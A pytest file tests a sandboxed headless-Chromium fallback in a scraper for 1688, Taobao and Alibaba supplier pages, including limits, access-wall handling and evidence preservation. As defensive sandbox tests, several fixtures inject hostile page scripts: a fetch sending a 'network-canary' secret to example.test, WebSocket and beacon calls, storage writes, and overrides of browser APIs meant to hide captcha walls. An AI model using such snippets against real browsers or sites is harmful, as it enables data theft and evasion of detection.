"""Policy checks plus mandatory, opt-in actual Chromium container checks."""
from copy import deepcopy
from hashlib import sha256
import json
import logging
import os
from pathlib import Path
import time

import httpx
import pytest

from backend.app.extraction.browser import eligibility, field_count, maybe_render, preserves, render_cached, _environment
from backend.app.extraction import extract_1688, extract_taobao, extract_alibaba
from backend.app.extraction.offer1688 import parse_1688_page
from backend.app.extraction.taobao import parse_taobao_page
from backend.app.extraction.alibaba import parse_alibaba_page
from backend.app.extraction.contracts import EVIDENCE_FIELDS

ADAPTERS = {"1688": (extract_1688, parse_1688_page), "TAOBAO": (extract_taobao, parse_taobao_page),
            "ALIBABA": (extract_alibaba, parse_alibaba_page)}
REAL = pytest.mark.skipif(os.getenv("VCT_TEST_BROWSER") != "true", reason="Actual Chromium checks run explicitly in the nonroot, network-denied image")


def fixture(platform="1688", extra="", *, render=True, delay=0):
    if platform == "1688":
        url = "https://detail.1688.com/offer/987654321012.html"
        page = f'<link rel="canonical" href="{url}"><div class="shop-company-name"><h1>Public supplier</h1></div>'
        markup = '<div class="review-item">Useful public review</div>'
    elif platform == "TAOBAO":
        url = "https://shop159450000.taobao.com/"
        model = {"seller": {"shopId": "159450000", "sellerId": "99", "shopName": "Public supplier"}}
        page = '<script>window.g_config=' + json.dumps(model) + ';</script>'
        markup = '<div class="shopProductShelfArea--test"><div class="shop-item-card"><a href="https://item.taobao.com/item.htm?id=777"><span class="title--test">Public product</span></a></div></div>'
    else:
        url = "https://www.alibaba.com/product-detail/Public-shirt_1600147809763.html"
        model = {"globalData": {"product": {"productId": "1600147809763", "subject": "Public shirt"}, "seller": {"companyName": "Public supplier"}}}
        page = '<script>window.detailData=' + json.dumps(model) + ';</script>'
        markup = '<div class="product-review"><div class="product-review-list"><div class="r-relative r-whitespace-normal">Useful public review</div></div></div>'
    program = "document.body.insertAdjacentHTML('beforeend'," + json.dumps(markup) + ");" if render else ""
    if render and delay:
        program = "setTimeout(() => {" + program + "}, " + str(delay) + ");"
    return url, '<html><head></head><body>' + page + '<script>' + program + extra + '</script></body></html>'


def extracted(platform="1688", **kwargs):
    url, html = fixture(platform, **kwargs)
    return ADAPTERS[platform][1](html, url), html


def gain(result):
    candidate = deepcopy(result)
    data = candidate["supplier_data"]
    data["reviews"] = [{"text": "Useful public review", "source_url": result["source_url"]}]
    candidate["reviews"] = data["reviews"]
    data["missing_fields"] = [name for name in EVIDENCE_FIELDS if data.get(name) is None]
    data["completeness"] = round(field_count(data) / 12, 4)
    return dict(code="GAIN", outcome=candidate, rendered_sha256="a" * 64, denials=2, dom_bytes=500)


@pytest.mark.parametrize("platform", ADAPTERS)
def test_bound_sparse_inline_signal_eligibility(platform):
    result, html = extracted(platform)
    assert result["extraction_status"] == "PARTIAL"
    assert eligibility(result, html, enabled=True) is None
    assert eligibility(result, html, enabled=False) == "DISABLED"


@pytest.mark.parametrize("status", ["SUCCESS", "AUTH_REQUIRED", "BLOCKED", "UNSUPPORTED_PAGE", "TIMEOUT", "PARSE_FAILED"])
def test_terminal_or_enough_evidence_never_launches(status):
    result, html = extracted()
    result["extraction_status"] = status
    assert maybe_render(result, html, html.encode(), enabled=True, renderer=lambda *_: pytest.fail("Unexpected launch")) is result


@pytest.mark.parametrize("script", [
    '// document.body.insertAdjacentHTML("beforeend", "review-item");',
    'const example="document.body.insertAdjacentHTML review-item";',
    'document.body.insertAdjacentHTML("beforeend", "unrelated");',
])
def test_irrelevant_or_quoted_dom_signals_do_not_launch(script):
    result, html = extracted(render=False, extra=script)
    assert eligibility(result, html, enabled=True) == "NO_DOM_SIGNAL"


def test_enough_external_inert_and_oversize_skip():
    result, html = extracted()
    enough = deepcopy(result)
    for name in EVIDENCE_FIELDS[:6]:
        enough["supplier_data"][name] = "present"
    assert eligibility(enough, html, enabled=True) == "ENOUGH_FIELDS"
    for replacement in ('<script src="https://example.test/bundle.js"></script>', '<template><script>document.write("review-item")</script></template>', '<script type="application/json">document.write("review-item")</script>'):
        _, plain = fixture(render=False)
        assert eligibility(result, plain.replace("<script></script>", replacement), enabled=True) == "NO_DOM_SIGNAL"
    assert eligibility(result, html + " " * 2_000_000, enabled=True) == "INPUT_LIMIT"


def test_strict_selection_and_original_hash(caplog):
    result, html = extracted()
    original = html.encode("utf-16")
    with caplog.at_level(logging.INFO, logger="backend.app.extraction.browser"):
        selected = maybe_render(result, html, original, enabled=True, renderer=lambda *_: gain(result))
    assert selected["supplier_data"]["extraction_method"] == "PUBLIC_BROWSER"
    assert selected["raw_payload"]["html_sha256"] == sha256(original).hexdigest()
    assert selected["raw_payload"]["rendered_html_sha256"] == "a" * 64
    assert selected["supplier_data"]["missing_fields"] != result["supplier_data"]["missing_fields"]
    assert "code=GAIN" in caplog.text and "fields_before=1 fields_after=2" in caplog.text
    assert "Public supplier" not in caplog.text and html not in caplog.text


@pytest.mark.parametrize("mutation", ["supplier_name", "source_url", "offer_id", "platform_supplier_id", "products"])
def test_identity_and_existing_evidence_conflicts_preserve_http(mutation):
    result, html = extracted()
    if mutation == "products":
        result["supplier_data"]["products"] = [{"offer_id": "987654321012", "title": "Old product"}]
    if mutation == "platform_supplier_id":
        result["supplier_data"][mutation] = "old-supplier"
    candidate = gain(result)
    candidate["outcome"]["supplier_data"][mutation] = "changed"
    assert maybe_render(result, html, html.encode(), enabled=True, renderer=lambda *_: candidate) is result


def test_list_extension_preserves_entries_and_never_merges():
    result, _ = extracted()
    before = result["supplier_data"]
    before["reviews"] = [{"text": "Old", "source_url": result["source_url"]}]
    after = deepcopy(before)
    after["reviews"].append({"text": "New", "source_url": result["source_url"]})
    assert preserves(before, after)
    after["reviews"].pop(0)
    assert not preserves(before, after)


@pytest.mark.parametrize("code", ["RUNTIME_UNAVAILABLE", "RUNTIME_FAILED", "DEADLINE", "DOM_LIMIT", "OUTPUT_LIMIT", "INVALID_OUTPUT"])
def test_failure_and_no_gain_preserve_useful_http(code):
    result, html = extracted()
    assert maybe_render(result, html, html.encode(), enabled=True, renderer=lambda *_: {"code": code}) is result
    assert maybe_render(result, html, html.encode(), enabled=True, renderer=lambda *_: dict(code="GAIN", outcome=result)) is result


@pytest.mark.parametrize("missing", ["raw_payload", "extracted_at", "both"])
def test_malformed_gain_restores_original_http_result(missing):
    result, html = extracted()
    original = deepcopy(result)
    candidate = gain(result)
    if missing in {"raw_payload", "both"}:
        del candidate["outcome"]["raw_payload"]
    if missing in {"extracted_at", "both"}:
        del candidate["outcome"]["supplier_data"]["extracted_at"]
    assert maybe_render(result, html, html.encode(), enabled=True, renderer=lambda *_: candidate) is result
    assert result == original


def test_stylesheet_hidden_access_text_is_not_a_wall():
    result, html = extracted("ALIBABA")
    html = html.replace("</head>", "<style>.hidden-wall {display:none}</style></head>")
    html = html.replace("<body>", '<body><p class="hidden-wall">Captcha</p>')
    selected = maybe_render(result, html, html.encode(), enabled=True, renderer=lambda *_: gain(result))
    assert selected["supplier_data"]["extraction_method"] == "PUBLIC_BROWSER"


@pytest.mark.parametrize("status", ["AUTH_REQUIRED", "BLOCKED"])
def test_rendered_access_wall_discards_snapshot(status):
    result, html = extracted()
    selected = maybe_render(result, html, html.encode(), enabled=True,
                            renderer=lambda *_: dict(code="ACCESS_WALL", outcome=dict(extraction_status=status)))
    assert selected["extraction_status"] == status
    assert "supplier_data" not in selected and "raw_payload" not in selected


@pytest.mark.parametrize("text,status", [("Please log in", "AUTH_REQUIRED"), ("Captcha", "BLOCKED")])
def test_http_access_wall_with_sparse_metadata_never_renders(text, status):
    result, html = extracted()
    html = html.replace("<body>", "<body><p>" + text + "</p>")
    selected = maybe_render(result, html, html.encode(), enabled=True,
                            renderer=lambda *_: pytest.fail("Access wall launched Chromium"))
    assert selected["extraction_status"] == status and "supplier_data" not in selected


@pytest.mark.parametrize("platform", ADAPTERS)
@pytest.mark.parametrize("kind", ["non_html", "blocked", "oversize", "unverified"])
def test_transport_failures_never_launch(platform, kind):
    adapter, _ = ADAPTERS[platform]
    url, html = fixture(platform)
    body, status, media = html, 200, "text/html"
    if kind == "non_html": media = "application/json"
    if kind == "blocked": status = 403
    if kind == "oversize": body = " " * 2_000_001
    if kind == "unverified": body = '<div>Shell</div><script>document.write("review-item")</script>'
    with httpx.Client(transport=httpx.MockTransport(lambda _: httpx.Response(status, headers={"content-type": media}, text=body))) as client:
        result = adapter(url, client=client, dns_check=lambda _: True, browser_fallback=True,
                         browser_renderer=lambda *_: pytest.fail("Unexpected launch"))
    assert result["extraction_status"] in {"PARSE_FAILED", "BLOCKED"}


def test_child_environment_is_secret_free(monkeypatch):
    for key in ("DATABASE_URL", "CLERK_SECRET_KEY", "AZURE_CLIENT_SECRET", "HTTP_PROXY", "NODE_OPTIONS", "PYTHONPATH"):
        monkeypatch.setenv(key, "sensitive-canary")
    env = _environment("/tmp/ephemeral")
    assert "sensitive-canary" not in json.dumps(env)
    assert set(env) <= {"PATH", "HOME", "TMPDIR", "LANG", "PYTHONDONTWRITEBYTECODE", "PYTHONUNBUFFERED", "PLAYWRIGHT_BROWSERS_PATH"}


@REAL
@pytest.mark.parametrize("platform", ADAPTERS)
def test_actual_chromium_gain_for_all_platforms(platform, caplog):
    result, html = extracted(platform)
    started = time.monotonic()
    with caplog.at_level(logging.INFO, logger="backend.app.extraction.browser"):
        selected = maybe_render(result, html, html.encode(), enabled=True)
    assert selected["supplier_data"]["extraction_method"] == "PUBLIC_BROWSER", caplog.text
    assert field_count(selected["supplier_data"]) > field_count(result["supplier_data"])
    assert preserves(result["supplier_data"], selected["supplier_data"])
    assert time.monotonic() - started < 11
    print(platform, "fields", field_count(result["supplier_data"]), "->", field_count(selected["supplier_data"]), "elapsed_ms", int((time.monotonic() - started) * 1000))


@REAL
def test_actual_network_state_popups_and_globals_are_not_collected(caplog):
    extra = '''
    window.arbitrarySecret = 'global-canary-do-not-retain';
    console.log('console-canary-do-not-retain');
    for (const action of [() => fetch('https://example.test/?secret=network-canary'),
      () => new WebSocket('wss://example.test/'), () => document.cookie='source-canary=1',
      () => localStorage.setItem('secret','storage-canary'), () => new RTCPeerConnection(),
      () => new Worker('https://example.test/worker.js'), () => window.open('https://example.test/'),
      () => document.createElement('iframe'), () => navigator.serviceWorker.register('https://example.test/sw.js')]) { try {action()} catch {} }
    for(const markup of ['<img src="https://example.test/image">','<iframe src="https://example.test/frame"></iframe>', '<iframe></iframe>', '<iframe srcdoc="frame-canary"></iframe>']) {
      try { document.body.insertAdjacentHTML('beforeend',markup); } catch {}
    }
    const a=document.createElement('a'); a.href='data:text/plain,download-canary'; a.download='page.txt'; document.body.appendChild(a); a.click();
    '''
    result, html = extracted(extra=extra)
    with caplog.at_level(logging.INFO, logger="backend.app.extraction.browser"):
        attempt = render_cached(html, result["source_url"], "1688", "ACCOUNT_PUBLIC", [])
    assert attempt["code"] == "GAIN", attempt
    assert attempt["denials"] >= 8
    retained = json.dumps(attempt) + caplog.text
    for secret in ("global-canary", "console-canary", "network-canary", "source-canary", "storage-canary", "download-canary", "frame-canary", "example.test"):
        assert secret not in retained


@REAL
@pytest.mark.parametrize("status,text", [("AUTH_REQUIRED", "Please log in"), ("BLOCKED", "Captcha")])
def test_actual_rendered_access_wall_has_no_evidence(status, text):
    # Build the wall text at runtime so the static source parser sees no wall.
    letters = json.dumps([ord(char) for char in text])
    result, html = extracted(extra='document.body.insertAdjacentHTML("afterbegin", "<p>" + ' + letters + '.map(n => String.fromCharCode(n)).join("") + "</p>");')
    assert result["extraction_status"] == "PARTIAL"
    selected = maybe_render(result, html, html.encode(), enabled=True)
    assert selected["extraction_status"] == status
    assert "supplier_data" not in selected


@REAL
def test_actual_source_csp_and_computed_hidden_dom_preserve_http():
    result, html = extracted()
    assert maybe_render(result, html, html.encode(), enabled=True, csp=["script-src 'none'"]) is result
    _, hidden = fixture(extra="document.querySelector('.review-item').classList.add('hidden-review');")
    hidden = hidden.replace('</head>', '<style>@media (min-width: 1px) {.hidden-review {display:none}}</style></head>')
    assert maybe_render(result, hidden, hidden.encode(), enabled=True) is result


@REAL
@pytest.mark.parametrize("program,code", [
    ('while(true){}', 'DEADLINE'),
    ('document.body.insertAdjacentHTML("beforeend", "<div>" + "x".repeat(2000001) + "</div>");', 'DOM_LIMIT'),
    ('document.querySelector(".shop-company-name h1").textContent="Changed supplier";', 'CONFLICT'),
])
def test_actual_limits_conflicts_and_descendant_cleanup(program, code, caplog):
    def descendants():
        running = set()
        for path in Path('/proc').iterdir():
            if path.name.isdigit():
                try:
                    command = (path / 'cmdline').read_bytes()
                except OSError:
                    # A killed descendant can be reaped between enumeration
                    # and inspection. Its disappearance is successful cleanup.
                    continue
                if any(name in command for name in (b'chrome-headless', b'playwright/driver', b'browser_runner')):
                    running.add(path.name)
        return running
    before = descendants()
    directories = set(Path('/tmp').glob('vct-browser-*'))
    result, html = extracted(extra=program)
    started = time.monotonic()
    with caplog.at_level(logging.INFO, logger="backend.app.extraction.browser"):
        assert maybe_render(result, html, html.encode(), enabled=True) is result
    assert f'code={code}' in caplog.text, caplog.text
    assert time.monotonic() - started < 11
    assert set(Path('/tmp').glob('vct-browser-*')) == directories
    assert descendants() <= before


@REAL
def test_actual_missing_runtime_fails_closed(monkeypatch, caplog):
    monkeypatch.setenv('PLAYWRIGHT_BROWSERS_PATH', '/missing-vct-browser')
    result, html = extracted()
    with caplog.at_level(logging.INFO, logger="backend.app.extraction.browser"):
        assert maybe_render(result, html, html.encode(), enabled=True) is result
    assert 'code=RUNTIME_UNAVAILABLE' in caplog.text


@REAL
def test_actual_repeat_canonical_navigation_is_denied_without_retry(caplog):
    url, _ = fixture()
    result, html = extracted(extra="window.location.href=" + json.dumps(url) + ";")
    with caplog.at_level(logging.INFO, logger="backend.app.extraction.browser"):
        selected = maybe_render(result, html, html.encode(), enabled=True)
    assert selected is result
    assert "code=RUNTIME_FAILED" in caplog.text or "code=CONFLICT" in caplog.text


@REAL
def test_actual_visibility_collection_resists_main_world_tampering():
    result, html = extracted(extra="""
      document.querySelector('.review-item').classList.add('hidden-review');
      window.getComputedStyle=()=>({display:'block',visibility:'visible',opacity:'1'});
      document.querySelectorAll=()=>[];
    """)
    html = html.replace('</head>', '<style>@media (min-width:1px) {.hidden-review {display:none}}</style></head>')
    assert maybe_render(result, html, html.encode(), enabled=True) is result


@REAL
def test_actual_size_collection_resists_main_world_tampering(caplog):
    result, html = extracted(extra="""
      window.TextEncoder=class {encode(){return new Uint8Array(0)}};
      document.body.insertAdjacentHTML('beforeend','<div>'+'x'.repeat(1000001)+'界'.repeat(400000)+'</div>');
    """)
    with caplog.at_level(logging.INFO, logger="backend.app.extraction.browser"):
        assert maybe_render(result, html, html.encode(), enabled=True) is result
    assert 'code=DOM_LIMIT' in caplog.text


@REAL
@pytest.mark.parametrize("operation", [
    "document.createElementNS('http://www.w3.org/1999/xhtml','x:iframe')",
    "document.body.appendChild(new DOMParser().parseFromString('<div xmlns=\"http://www.w3.org/1999/xhtml\"><x:iframe xmlns:x=\"http://www.w3.org/1999/xhtml\"/></div>','application/xml').documentElement)",
])
def test_actual_prefixed_html_frame_is_denied(operation):
    program = "let denied=false;try{" + operation + ";}catch(e){denied=e.name==='SecurityError';}document.body.insertAdjacentHTML('beforeend','<div class=\"review-item\">'+(denied?'DENIED':'ALLOWED')+'</div>');"
    result, html = extracted(render=False, extra=program)
    selected = maybe_render(result, html, html.encode(), enabled=True)
    assert selected["supplier_data"]["extraction_method"] == "PUBLIC_BROWSER"
    assert [review["text"] for review in selected["reviews"]] == ["DENIED"]


@REAL
@pytest.mark.parametrize("platform", ["TAOBAO", "ALIBABA"])
def test_actual_global_this_proxy_cannot_hide_access_wall(platform):
    letters = json.dumps([ord(char) for char in "Captcha"])
    program = "globalThis=new Proxy(window,{get(target,key){return key==='__vctAccess'?null:Reflect.get(target,key)}});document.body.insertAdjacentHTML('afterbegin','<p>'+" + letters + ".map(n=>String.fromCharCode(n)).join('')+'</p>');"
    result, html = extracted(platform, extra=program)
    assert result["extraction_status"] == "PARTIAL"
    selected = maybe_render(result, html, html.encode(), enabled=True)
    assert selected["extraction_status"] == "BLOCKED"
    assert 'supplier_data' not in selected and 'raw_payload' not in selected


@REAL
@pytest.mark.parametrize("platform", ADAPTERS)
def test_actual_500ms_inline_timer_produces_gain(platform):
    result, html = extracted(platform, delay=500)
    selected = maybe_render(result, html, html.encode(), enabled=True)
    assert selected["supplier_data"]["extraction_method"] == "PUBLIC_BROWSER"
    assert field_count(selected["supplier_data"]) > field_count(result["supplier_data"])


@REAL
@pytest.mark.parametrize("platform", ADAPTERS)
def test_actual_adapter_forwards_response_csp(platform, caplog):
    source, html = fixture(platform)
    adapter = ADAPTERS[platform][0]
    with httpx.Client(transport=httpx.MockTransport(lambda _: httpx.Response(200, headers={
            'content-type': 'text/html', 'content-security-policy': "script-src 'none'"}, text=html))) as client:
        with caplog.at_level(logging.INFO, logger="backend.app.extraction.browser"):
            selected = adapter(source, client=client, dns_check=lambda _: True, browser_fallback=True)
    assert selected["supplier_data"]["extraction_method"] == "PUBLIC_HTTP"
    assert 'code=NO_GAIN' in caplog.text


@REAL
@pytest.mark.parametrize("operation,empty_read", [
    ("document.cookie", True), ("document.cookie='source-canary=1'", False),
    ("localStorage.setItem('key','storage-canary')", False),
    ("sessionStorage.setItem('key','storage-canary')", False),
    ("indexedDB.open('storage-canary')", False), ("caches.open('storage-canary')", False),
])
def test_actual_each_cookie_storage_operation_is_denied(operation, empty_read):
    action = "denied=(" + operation + ")==='';" if empty_read else operation + ";"
    program = "let denied=false;try{" + action + "}catch(e){denied=e.name==='SecurityError';}document.body.insertAdjacentHTML('beforeend','<div class=\"review-item\">'+(denied?'DENIED':'ALLOWED')+'</div>');"
    result, html = extracted(render=False, extra=program)
    selected = maybe_render(result, html, html.encode(), enabled=True)
    assert selected["supplier_data"]["extraction_method"] == "PUBLIC_BROWSER"
    assert [review["text"] for review in selected["reviews"]] == ["DENIED"]


@REAL
def test_actual_reachable_loopback_http_and_websocket_receive_no_browser_traffic():
    from base64 import b64encode
    from hashlib import sha1
    from http.client import HTTPConnection
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    import socket
    from threading import Thread

    arrivals = {"http": 0, "websocket": 0}
    class Canary(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.headers.get('Upgrade', '').lower() == 'websocket':
                arrivals['websocket'] += 1
                key = self.headers['Sec-WebSocket-Key'] + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
                self.send_response(101)
                self.send_header('Upgrade', 'websocket')
                self.send_header('Connection', 'Upgrade')
                self.send_header('Sec-WebSocket-Accept', b64encode(sha1(key.encode()).digest()).decode())
            else:
                arrivals['http'] += 1
                self.send_response(200)
                self.send_header('Content-Length', '0')
            self.end_headers()
            self.close_connection = True
        def do_POST(self):
            arrivals['http'] += 1
            self.send_response(200)
            self.send_header('Content-Length', '0')
            self.end_headers()
        def log_message(self, *_):
            pass

    server = ThreadingHTTPServer(('127.0.0.1', 0), Canary)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    port = server.server_port
    try:
        connection = HTTPConnection('127.0.0.1', port, timeout=2)
        connection.request('GET', '/preflight')
        assert connection.getresponse().status == 200
        connection.close()
        with socket.create_connection(('127.0.0.1', port), timeout=2) as connection:
            connection.sendall(b'GET /preflight HTTP/1.1\r\nHost: localhost\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\r\n')
            assert b' 101 ' in connection.recv(4096)
        assert arrivals == {'http': 1, 'websocket': 1}
        arrivals.update(http=0, websocket=0)
        http_url = 'http://127.0.0.1:' + str(port)
        ws_url = 'ws://127.0.0.1:' + str(port)
        program = """
          const base=HTTP_BASE,ws=WS_BASE;
          for(const action of [()=>fetch(base+'/fetch'), ()=>new WebSocket(ws+'/socket'),
            ()=>{const x=new XMLHttpRequest();x.open('GET',base+'/xhr');x.send()},
            ()=>navigator.sendBeacon(base+'/beacon','canary'),
            ()=>{const image=document.createElement('img');image.src=base+'/image';document.body.appendChild(image)},
            ()=>window.open(base+'/popup'), ()=>document.body.insertAdjacentHTML('beforeend','<iframe src="'+base+'/frame"></iframe>')]) {
              try {action()} catch {}
          }
        """.replace('HTTP_BASE', json.dumps(http_url)).replace('WS_BASE', json.dumps(ws_url))
        result, html = extracted(extra=program)
        selected = maybe_render(result, html, html.encode(), enabled=True)
        assert selected['supplier_data']['extraction_method'] == 'PUBLIC_BROWSER'
        assert arrivals == {'http': 0, 'websocket': 0}
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)
